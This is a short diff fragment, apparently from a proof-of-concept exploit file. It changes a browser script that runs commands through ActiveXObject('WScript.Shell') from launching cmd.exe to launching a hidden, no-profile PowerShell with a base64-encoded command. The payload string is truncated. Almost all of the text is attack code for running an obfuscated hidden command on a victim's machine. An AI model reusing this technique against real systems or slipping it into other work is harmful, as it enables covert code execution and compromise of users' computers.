@@ -2974,7 +2974,7 @@ POC:
 
 <script>
 
-  var c= 'cmd.exe'
+  var c= 'powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC...d7Ks'; 
   new ActiveXObject('WScript.Shell').Run(c);
   
 </script>
